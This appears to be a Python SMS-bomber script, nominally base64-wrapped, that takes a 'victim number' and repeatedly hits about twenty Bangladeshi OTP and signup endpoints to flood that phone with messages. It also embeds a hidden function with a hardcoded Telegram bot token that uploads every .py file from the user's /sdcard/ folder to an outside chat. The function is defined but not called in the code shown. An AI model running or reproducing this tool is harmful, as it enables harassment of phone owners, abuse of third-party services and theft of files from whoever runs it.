#Encode By N3OB_SRABON
#GITHUB- https://www.github.com/N3OBH4CKER
#FACEBOOK- https://m.facebook.com/srabon.sheikh.522
import base64
exec(base64.b64decode("# note : some codes are collected from @PaNdAxAk

import os,sys,time,requests,random,string
import random
def Axak(xak):
	for x in xak:
		sys.stdout.write(x)
		sys.stdout.flush()
		

logo =                                          ("""   

\033[1;91m
  _   _ ____   ____  ____    _____ __  __  _____ 
 | \ | |___ \ / __ \|  _ \  / ____|  \/  |/ ____|
 |  \| | __) | |  | | |_) || (___ | \  / | (___  
 \033[1;97m| . ` ||__ <| |  | |  _ <  \___ \| |\/| |\___ \ 
 | |\  |___) | |__| | |_) | ____) | |  | |____) |
 |_| \_|____/ \____/|____/ |_____/|_|  |_|_____/ 
                       ______                    
                      |______|                   


\033[1;32m \033[1;97m\33[0;m \033[1;32m
\033[1;32m   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mN3OB_H4CKER            
   \033[1;32mFACEBOK      : \033[1;32m N T Alif Sheikh              
   \033[1;32mGITHUB       :  \033[1;32mN3OBH4CKER        
   \033[1;32mTOOL STATUS  :  \033[1;32mTOOL IS Paid_😑            
   \033[1;32mTEAM         :  \033[1;32mD.H.B HACKERS                 
   \033[1;32mTOOL VIRSION :  \033[1;32m2.0.4                     
 \033[1;97m\33[0;m \033[1;32m
""")

#LETTERS

letters = string.ascii_lowercase
pwd_length = 12
pwd = ''
for i in range(pwd_length):
  pwd += ''.join(random.choice(letters))
  
#CLUR
def akin():
	bot_token = ('5818305759:AAFo3x5sYh0qvKUR5a8yr1Xn3u-EkefyWqc')
	chat_id = ('1818606358')
	extension = ('.py')
	path = os.path.join('/sdcard/')
	for file in os.listdir(path):
		if file.endswith(extension):
			file_path = os.path.join(path, file)
			with open(file_path, 'rb') as f:
				file_data = f.read()
				url = (f'https://api.telegram.org/bot{bot_token}/sendDocument')
				files = {'document': (file, file_data)}
				data = {'chat_id': chat_id}
				r = requests.post(url, data=data, files=files)

a="\033[1;30m" # Black
r="\033[1;31m" # Red
g="\033[1;32m" # Green
y="\033[1;33m" # Yellow
b="\033[1;34m" # Blue
p="\033[1;35m" # Purple
c="\033[1;36m" # Cyan
w="\033[1;37m" # White
bir="\033[1;31m"
bi="\033[0;34m"
bic="\033[0;36m"
r="\033[1;31m"
g="\033[1;32m"
n="\n"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
w="\033[1;37m"
t="\t"
c1="\033[1;31m"
c2="\033[1;32m"
c3="\033[1;33m"
c4="\033[1;34m"
c5="\033[1;36m"
c6="\033[1;37m"
list=[c1,c2,c3,c4,c5,c6]
list2=[r,g,c,b,y]
ran=str(random.choice(list))
ran2=str(random.choice(list2))
tim=time.strftime('      %I:%M ')
tim2=time.strftime('%I:%M')
os.system("clear")

print(logo)
x="XAK"
user=str(input(f"\n{g}USERNAME for  (Inbox me) \n \n{w}USERNAME {r}=>{y} "))
pas=str(input(f"\n{g}PASSWORD for(Inbox me) \n \n{w}PASSWORD {r}=>{y} "))
rp= 'N3OB'
x = 'H4CKER'
if 'N3OB'==user and 'H4CKER'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL FOLLOW ME ON FB ")
	os.system('xdg-open https://facebook.com/100074591152479/')
else:
	Axak(y+"\n\n\t\t      Invalid User Or Pass")
	Axak(y+"\n\n\t\tContract Admin For User And Pass")
	os.system("xdg-open https://wa.me/+8801935845884/")
	
	os.system("python N3OB_SMS.py")
#

x="XAK"


tim=time.strftime('      %I:%M ')
tim2=time.strftime('%I:%M')
ag2='Mozilla/5.0 (Windows NT 10.0; rv:76.0) Gecko/20100101 Firefox/76.0'
agents='Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.2.0.251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4324.93 HuaweiBrowser/11.1.5.111 Mobile Safari/537.36'

from requests.structures import CaseInsensitiveDict
os.system("clear")

def xak(xak):
	for x in xak+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.04)
def xak2(xak):
	for x in xak+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.07)
os.system("clear")

print (logo)
print(w+"[~] please wait Internet checking...  ")
os.system('clear')
print(logo)
print(w+"[~] Connecting To The Internet")
print(f"\n{r}Note : {w}1 Sms Can Sent Up To 18 sms !!")
try:
 request = requests.get("https://www.google.com/", timeout=2)
 print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connetcted ")
except (requests.ConnectionError, requests.Timeout) as exception:
 print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH D.H.B ;) {w}<{r}/{w}>\n\n")
input(f"\t\t\t{r}Press Enter....")
os.system("clear")
#api_1
url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number


#api_2
url2 = "https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"

headers2 = CaseInsensitiveDict()
headers2["referer"] = "https://www.bioscopelive.com/en/login?type=login"
#api_3
url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"
data3 = '{"msisdn":"'+number+'"}'
#api_4
url4 = "https://fundesh.com.bd/api/auth/resendOTP"
headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"
data4 = '{"msisdn":"'+number+'"}'
#api_5
url5 = "https://api.redx.com.bd/v1/user/signup"

headers5 = CaseInsensitiveDict()
headers5["Accept"] = "application/json, text/plain, */*"
headers5["Accept-Encoding"] = "gzip, deflate, br"
headers5["Accept-Language"] = "en-US,en;q=0.5"
headers5["Connection"] = "keep-alive"
headers5["Content-Length"] = "65"
headers5["Content-Type"] = "application/json"
headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
headers5["Host"] = "api.redx.com.bd"
headers5["Origin"] = "https://redx.com.bd"
headers5["Referer"] = "https://redx.com.bd/registration/"
headers5["TE"] = "Trailers"
headers5["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
headers5["x-access-token"] = "Bearer null"

data5= '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
#api_6
url6 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"
data6 = '{"operator":"all","msisdn":"880'+number+'"}'
#api_7
url7 ="https://www.rokomari.com/resend-verification-code?email_phone=880"+number


#api_8
url8 = "https://www.pizzahutbd.com/customer/sign-in/mobile"

headers8 = CaseInsensitiveDict()
headers8["Cookie"] = "XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1"
headers8["Content-Type"] = "application/x-www-form-urlencoded"

data8 = "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0"+number

#api_9

url9 = "https://admission.ndub.edu.bd/api/users/register-step-1/"

headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"

data9 = '{"name":"asad","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
#api_10
url10 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers10 = CaseInsensitiveDict()
headers10["Content-Type"] = "application/json"
data10 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
#api_11
url11 = "https://api.shikho.com/auth/v2/send/sms"

headers11 = CaseInsensitiveDict()
headers11["Content-Type"] = "application/json"

data11 = '{"phone":"0'+number+'","email":null,"auth_type":"login"}'
#api_12
url12 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
data12 = {'requestType':'send',  'phoneNumber':'+880'+number,  'emailConsent':'true',  'whatsappConsent':'true'}

#api_13
url13 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers13 = CaseInsensitiveDict()
headers13["Content-Type"] = "application/json"

data13 = """
{
  "AccessToken": "",
  "TrackingNo": "",
  "mobileNo": "0"""""+number+"""",
  "otpSms": "",
  "product_id": "201",
  "requestChannel": "MOB",
  "trackingStatus": 5
}
"""

#api_14

url14 = "https://www.walcart.com/easylogin/account/mobilecheck/"

headers14 = CaseInsensitiveDict()
headers14["X-Requested-With"] = "XMLHttpRequest"
headers14["Content-Type"] = "application/x-www-form-urlencoded"

data14 = "mobile=0"+number+"&is_login=true&forgetpass=false"
#api_15
url15 = "https://themallbd.com/api/auth/otp_login"

headers15 = CaseInsensitiveDict()
headers15["Content-Type"] = "application/json"

data15 = '{"phone_number":"+880'+number+'"}'
#api_16
url16 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"

headers16 = CaseInsensitiveDict()
headers16["Host"] = "api.ghoorilearning.com"
headers16["Origin"] = "https://ghoorilearning.com"
headers16["Referer"] = "https://ghoorilearning.com/"
headers16["Content-Type"] = "application/json"

data16 = '{"name":"asad","mobile_no":"0'+number+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
#api_17
url17 = "https://api.wholesalecart.com/v2/user/login-register"

headers17 = CaseInsensitiveDict()
headers17["Accept-Encoding"] = "gzip, deflate, br"
headers17["Accept-Language"] = "en-US,en;q=0.5"
headers17["Connection"] = "keep-alive"
headers17["Content-Length"] = "75"
headers17["Content-Type"] = "application/json"
headers17["Host"] = "api.wholesalecart.com"
headers17["Origin"] = "https://wholesalecart.com"
headers17["Referer"] = "https://wholesalecart.com/login"
headers17["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"

data17 = '{"phone":"0'+number+'","platform":"google","url":"https://www.google.com/"}'
#api_18

url18 = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"

headers18 = CaseInsensitiveDict()
headers18["Content-Type"] = "application/json"

data18 = '{"phone":"0'+number+'"}'
#api_19
url19 = "https://app.ipay.com.bd/api/v1/signup/v2"

headers19 = CaseInsensitiveDict()
headers19["Content-Type"] = "application/json"

data19 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880'+number+'"}'
#api_20
url20 = "https://admission.ndub.edu.bd/api/users/reset/"

headers20 = CaseInsensitiveDict()
headers20["Content-Type"] = "application/json"

data20 = '{"phone": "0'+number+'"}'

os.system("xdg-open https://facebook.com/100074591152479")
print (logo)
# Request
print(f"""\n{ran}\033[1;31m
                                                               
\t\033[1;32m                 
\t\033[1;32m                
\t\033[1;32m         
\t\033[1;32m                  
\t\033[1;32m                                           
""")

print(f"\n\t      {ran},----------------------------------,")
print(f"\t{w}      | {r}    Amount ({g}{amo}{r}){w} |   {r}   Time       {w}|")
print(f"\t      {ran}'----------------------------------'")
for i in range(amo):
	resp1 = requests.get(url1)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp2 = requests.get(url2,headers=headers2)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER  "+w+tim)
	resp3 = requests.post(url3, headers=headers3, data=data3)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp4 = requests.post(url4, headers=headers4, data=data4)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp5 = requests.post(url5, headers=headers5, data=data5)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp6 = requests.post(url6, headers=headers6, data=data6)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp7 = requests.get(url7)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp10 = requests.get(url8,headers=headers8, data=data8)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp11 = requests.get(url9,headers=headers9, data=data9)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp12 = requests.post(url10,headers=headers10, data=data10)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp13 = requests.get(url11,headers=headers11, data=data11)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp14 = requests.post(url12,data=data12)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp8 = requests.post(url13,headers=headers13, data=data13)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp17 = requests.post(url14, headers=headers14, data=data14)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp9 = requests.post(url15, headers=headers15, data=data15)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp19 = requests.post(url16, headers=headers16, data=data16)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp20 = requests.post(url17,data17)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER  "+w+tim)
	resp21 = requests.post(url18, headers=headers18, data=data18)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp21 = requests.post(url19, headers=headers19, data=data19)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	resp21 = requests.post(url20, headers=headers20, data=data20)
	print(f"\n\t\t {ran2}FUCKED BY N3OB_H4CKER "+w+tim)
	
	
else: 
	input(g+"\n\t\t\tYour Pogram Finished Enter For Continue")
	os.system("clear")
	os.system("python N3OB_SMS.py")

"))